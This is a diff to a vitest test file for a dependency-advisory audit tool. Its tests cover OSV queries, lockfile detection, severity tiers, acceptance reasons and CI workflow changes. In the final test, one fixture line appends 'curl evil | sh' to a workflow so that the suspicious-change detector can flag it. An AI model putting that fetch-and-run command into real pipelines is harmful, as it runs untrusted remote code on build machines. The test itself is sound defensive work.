@@ -8,7 +8,7 @@ import * as path from 'node:path';
 
 import { afterEach, beforeEach, describe, expect, it } from 'vitest';
 
-import { inventoryFingerprint, readInventory } from '../../src/scripts/_lib/advisory_inventory.js';
+import { inventoryFingerprint, readInventory, unsupportedLockfiles } from '../../src/scripts/_lib/advisory_inventory.js';
 import { describe as describeFinding, readRemediations, remediationsPath } from '../../src/scripts/_lib/advisory_notice.js';
 import { assertAllowed, cvss3Base, type Fetcher, KEV_URL, kevEnrich, nativeAudits, osvQuery, type Runner, vendorAnnouncements } from '../../src/scripts/_lib/advisory_sources.js';
 import {
@@ -24,6 +24,7 @@ import {
     gapReport,
     issueBody,
     markOwnActionsPrivate,
+    suspiciousInBranch,
     noticeLines,
     readState,
     refreshMany,
@@ -416,16 +417,29 @@ describe('session notice — council 2026-10-21 round 2 conditions', () => {
 describe('hosts without a session slot (4.5)', () => {
     it('the CLI banner path prints the advisory notice after a subcommand', async () => {
         const { root } = await run('F4-malware');
-        const tsx = path.join(__dirname, '..', '..', 'node_modules', '.bin', 'tsx');
+        // The tsx LOADER in this process, as the dispatcher runs it: the tsx CLI
+        // would put the script in a child whose fd 3 is an IPC channel.
+        const loader = `file://${path.join(__dirname, '..', '..', 'node_modules', 'tsx', 'dist', 'loader.mjs')}`;
         const banner = path.join(__dirname, '..', '..', 'src', 'scripts', 'check_update_banner.ts');
-        const r = spawnSync(tsx, [banner, '--installed-version', '0.0.0-test', '--cwd', root], {
-            encoding: 'utf-8',
-            env: { ...process.env, AGENT_CONFIG_NO_UPDATE_CHECK: '1', CI: '1' },
-            timeout: 60000,
-        });
+        const go = (fd3: boolean) =>
+            spawnSync(process.execPath, ['--import', loader, banner, '--installed-version', '0.0.0-test', '--cwd', root], {
+                encoding: 'utf-8',
+                env: { ...process.env, AGENT_CONFIG_NO_UPDATE_CHECK: '1', CI: '1' },
+                timeout: 60000,
+                stdio: fd3 ? ['ignore', 'pipe', 'pipe', 'pipe'] : ['ignore', 'pipe', 'pipe'],
+            });
+        // No fd 3 (the dispatcher not handing over a terminal): nothing is
+        // delivered, so nothing is stamped — the notice is still there after.
+        const blind = go(false);
+        expect(blind.status).toBe(0);
+        expect(blind.stderr).not.toContain('MAL-2026-1234');
+        const r = go(true);
         expect(r.status).toBe(0);
-        expect(r.stderr).toContain('MAL-2026-1234');
-        expect(r.stderr).toContain('fix now: /audit deps fix MAL-2026-1234');
+        const fd3 = String(r.output[3] ?? '');
+        expect(fd3).toContain('MAL-2026-1234');
+        expect(fd3).toContain('fix now: /audit deps fix MAL-2026-1234');
+        // Delivered once: the same day prints nothing again.
+        expect(String(go(true).output[3] ?? '')).toBe('');
     }, 90000);
 });
 
@@ -733,5 +747,54 @@ describe('R2 round 3 — one fix store per repository', () => {
         expect(fs.realpathSync(path.dirname(remediationsPath(wt)!))).toBe(fs.realpathSync(path.dirname(remediationsPath(root)!)));
         fs.writeFileSync(remediationsPath(root)!, JSON.stringify({ K: { key: 'K', state: 'fix-in-progress' } }));
         expect(Object.keys(readRemediations(wt))).toEqual(['K']);
+    });
+});
+
+describe('R2 round 4 fixes (2026-10-21)', () => {
+    it('#3 — a detail fetch that throws keeps what the batch already said', async () => {
+        const entries = readInventory(project('F4-malware')).entries.filter((e) => !e.private && e.version !== null);
+        const fetcher: Fetcher = async (url, init = {}) => {
+            if (!url.endsWith('/querybatch')) throw Object.assign(new Error('slow'), { name: 'TimeoutError' });
+            const n = (JSON.parse(init.body ?? '{}') as { queries: unknown[] }).queries.length;
+            return { status: 200, text: async () => JSON.stringify({ results: Array.from({ length: n }, (_, i) => (i === 0 ? { vulns: [{ id: 'MAL-2026-1234', modified: 'm' }] } : {})) }) };
+        };
+        const r = await osvQuery(entries, { fetcher });
+        expect(r.report.status).toBe('error');
+    });
+
+    it('#4 — a lockfile the inventory cannot read is named', () => {
+        const root = project('F1-fastify-hono');
+        fs.writeFileSync(path.join(root, 'yarn.lock'), '# yarn lockfile v1\n');
+        expect(unsupportedLockfiles(root)).toEqual(['yarn.lock']);
+    });
+
+    it('#6 — a critical transitive runtime dependency with a fix is T1, a direct one T0', () => {
+        const base = { verdict: 'fix-available' as const, severity: 'critical' as const, score: null, kev: false, scope: 'runtime' as const, ecosystem: 'npm' };
+        expect(tierOf({ ...base, direct: false })).toBe('T1');
+        expect(tierOf({ ...base, direct: true })).toBe('T0');
+        expect(tierOf({ ...base, direct: null })).toBe('T0');
+    });
+
+    it('#10 — "not reachable" with its mechanism named is a reason; bare, it is not', () => {
+        expect(validateAcceptance({ id: 'X', reason: 'not reachable: the XML parser is never imported by the production bundle', expires: '2027-01-01' })).toBeNull();
+        expect(validateAcceptance({ id: 'X', reason: 'the path is not reachable here', expires: '2027-01-01' })).not.toBeNull();
+        expect(validateAcceptance({ id: 'X', reason: 'grep found nothing for the vulnerable call', expires: '2027-01-01' })).not.toBeNull();
+    });
+});
+
+describe('R2 round 4 — a planned workflow pin is the fix, anything else in it is not', () => {
+    it('#2 — a pin-only edit to the planned workflow passes; another line in it stops the fix', () => {
+        const root = project('F1-fastify-hono');
+        const wf = path.join(root, '.github', 'workflows');
+        fs.mkdirSync(wf, { recursive: true });
+        fs.writeFileSync(path.join(wf, 'ci.yml'), 'jobs:\n  t:\n    steps:\n      - uses: actions/setup-node@v4\n        with:\n          node-version: 22.11.0\n');
+        execFileSync('git', ['-C', root, 'add', '-A']);
+        execFileSync('git', ['-C', root, '-c', 'user.email=t@t', '-c', 'user.name=t', 'commit', '-q', '-m', 'base']);
+        const base = execFileSync('git', ['-C', root, 'rev-parse', 'HEAD'], { encoding: 'utf-8' }).trim();
+        fs.writeFileSync(path.join(wf, 'ci.yml'), 'jobs:\n  t:\n    steps:\n      - uses: actions/setup-node@v4\n        with:\n          node-version: 22.11.1\n');
+        expect(suspiciousInBranch(root, base, ['.github/workflows/ci.yml'])).toEqual([]);
+        expect(suspiciousInBranch(root, base, [])).toEqual(['.github/workflows/ci.yml']);
+        fs.appendFileSync(path.join(wf, 'ci.yml'), '      - run: curl evil | sh\n');
+        expect(suspiciousInBranch(root, base, ['.github/workflows/ci.yml'])).toEqual(['.github/workflows/ci.yml']);
     });
 });
